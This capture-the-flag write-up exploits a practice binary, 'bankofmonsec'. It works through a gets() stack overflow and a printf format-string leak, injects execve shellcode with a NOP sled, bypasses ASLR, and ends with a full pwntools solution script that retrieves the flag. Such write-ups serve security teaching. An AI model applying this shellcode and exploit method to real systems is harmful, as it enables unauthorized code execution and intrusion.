## Challenge writeup

In this challenge, you are given the executable `./bankofmonsec`. The program gives the following prompt when running it:
```
+----------------------+
|                      |
|    Welcome to the    |
|    Bank of MonSec    |
|                      |
+----------------------+
Please log in to continue.

Name: leo
Hello, leo
password: asdf
Sorry, no flag for you :(
```
Most of the logic for this program occurs within the function `login`
```
Dump of assembler code for function login:
   0x080491f6 <+0>:     endbr32
   0x080491fa <+4>:     push   esi
   0x080491fb <+5>:     push   ebx
   0x080491fc <+6>:     sub    esp,0x3c
   0x080491ff <+9>:     call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049204 <+14>:    add    ebx,0x2dfc
   0x0804920a <+20>:    lea    eax,[ebx-0x1ff8]
   0x08049210 <+26>:    push   eax
   0x08049211 <+27>:    push   0x1
   0x08049213 <+29>:    call   0x80490d0 <__printf_chk@plt>
   0x08049218 <+34>:    add    esp,0x4
   0x0804921b <+37>:    lea    esi,[esp+0x14]
   0x0804921f <+41>:    push   esi
   0x08049220 <+42>:    call   0x8049090 <gets@plt>
   0x08049225 <+47>:    add    esp,0x8
   0x08049228 <+50>:    lea    eax,[ebx-0x1ff1]
   0x0804922e <+56>:    push   eax
   0x0804922f <+57>:    push   0x1
   0x08049231 <+59>:    call   0x80490d0 <__printf_chk@plt>
   0x08049236 <+64>:    add    esp,0x8
   0x08049239 <+67>:    push   esi
   0x0804923a <+68>:    push   0x1
   0x0804923c <+70>:    call   0x80490d0 <__printf_chk@plt>
   0x08049241 <+75>:    mov    DWORD PTR [esp],0xa
   0x08049248 <+82>:    call   0x80490c0 <putchar@plt>
   0x0804924d <+87>:    add    esp,0x8
   0x08049250 <+90>:    lea    eax,[ebx-0x1fe9]
   0x08049256 <+96>:    push   eax
   0x08049257 <+97>:    push   0x1
   0x08049259 <+99>:    call   0x80490d0 <__printf_chk@plt>
   0x0804925e <+104>:   add    esp,0x4
   0x08049261 <+107>:   lea    eax,[esp+0x28]
   0x08049265 <+111>:   push   eax
   0x08049266 <+112>:   call   0x8049090 <gets@plt>
   0x0804926b <+117>:   add    esp,0x44
   0x0804926e <+120>:   pop    ebx
   0x0804926f <+121>:   pop    esi
   0x08049270 <+122>:   ret
```

From this assembly listing, you can see that both of the user inputs are taken using the function `gets` which makes the program vulnerable to buffer overflows. We can see the security protections enabled by using `checksec` from pwntools.
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
One further observation is that the call to `printf` at `login+59` is vulnerable to a format string injection.
```
Name: %x %x %x
Hello, ff939b78 f7da343b f7f19d20
```
There are several ways to approach this challenge, but the following method was the simplest way that I have found. Because there is no NX bit set, we can write our own shellcode to the stack and then jump to it. To do this, we need to find the offset of EIP on the stack and then overwrite it to the address where we placed our shellcode. 
```
pwndbg> break *login+122
Breakpoint 1 at 0x8049270
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> r < <(python2 -c "print 'aaa\n' + 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'")
...
pwndbg> info frame
Stack level 0, frame at 0xffffd210:
 eip = 0x8049270 in login; saved eip = 0x61616169
 called by frame at 0xffffd214
 Arglist at 0xffffd208, args:
 Locals at 0xffffd208, Previous frame's sp is 0xffffd210
 Saved registers:
  eip at 0xffffd20c
pwndbg> cyclic -l 0x61616169
32
pwndbg> x/s $esp
0xffffd20c:     "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
```
To place and jump to our shellcode, we'll need a pad of 32 bytes, followed by the bytes `(0xffffd20c+4)` and our shellcode. I'll be using the following shellcode which executes `execve("/bin/bash", ["/bin/bash", "-p"], NULL)`:
```
\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
```
I will also include a small [NOP sled](https://reverseengineering.stackexchange.com/questions/16706/what-causes-the-need-for-nop-sleds) using the bytes `\x90` so that we don't have to get the address perfect, but it shouldn't matter in this instance. 
```
pwndbg> r < <(python2 -c "from pwn import p32; print 'aaa\n' + 'a'*32 + p32(0xffffd20c+4) + b'\x90'*15 + b'\x6a\x0b\x58\x9
9\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'")
Starting program: /mnt/d/Users/leo/Documents/MEGA/test/bankofmonsec < <(python2 -c "from pwn import p32; print 'aaa\n' + 'a'*32 + p32(0xffffd20c+4) + b'\x90'*15 + b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'")
+----------------------+
|                      |
|    Welcome to the    |
|    Bank of MonSec    |
|                      |
+----------------------+
Please log in to continue.

Name: Hello, aaa
process 325 is executing new program: /usr/bin/bash
[Inferior 1 (process 325) exited normally]
```

However, when we try to use this exploit outside of GDB, our payload does not work any more, and we instead get a Segmentation fault.
```
$ python2 -c "from pwn import p32; print 'aaa\n' + 'a'*32 + p32(0xffffd20c+4) + b'\x90'*15 + b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\
x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'" | ./bankofmonsec
+----------------------+
|                      |
|    Welcome to the    |
|    Bank of MonSec    |
|                      |
+----------------------+
Please log in to continue.

Name: Hello, aaa
Segmentation fault
```
This is the result of [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), as - more often than not - the address `0xffffd20c+4` we have hardcoded will not point to the start of our shellcode. A common approach to get around this is to include a large NOP sled and use brute force. However, we can bypass this using a memory leak from the format string injection I mentioned earlier. By passing `%p` as our name, we can find an address on the stack, and then calculate the value to overwrite EIP with relative to that. GDB disables ASLR by default, and so running our program in that will let us find the correct offset.
```
pwndbg> break *login+122
Breakpoint 1 at 0x8049270
pwndbg> r
Starting program: /bankofmonsec
+----------------------+
|                      |
|    Welcome to the    |
|    Bank of MonSec    |
|                      |
+----------------------+
Please log in to continue.

Name: %p
Hello, 0xffffd208
password: asdf
...
pwndbg> p $esp
$1 = (void *) 0xffffd20c
```
Here, the address of the stack pointer is four bytes above the address leaked by printf. Therefore, we can make our payload bypass ASLR by overwriting the value of EIP saved on the stack with the address leaked from printf plus 8. Here is the solution script that I used:
```python
from pwn import *

nop = b'\x90'
shellcode = b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'

#p = process('./bankofmonsec')
p = remote('192.168.0.14', 9000)

p.recvuntil(b'continue.')
p.recvline()
p.recvline()
p.send("%p\n")
addr = int(p.recvline().split()[-1], 16)

p.send('a'*32 + p32(addr+8) + nop*15 + shellcode + '\n')
p.interactive()
```
```bash
$ python2 solution.py
[+] Opening connection to 192.168.0.14 on port 9000: Done
[*] Switching to interactive mode
password: $ ls
Dockerfile  Makefile  bankofmonsec  bankofmonsec.c  flag.txt  levelup.zip
$ cat flag.txt
FLAG{f0rm47_57r1n65_4r3_u53ful}
```
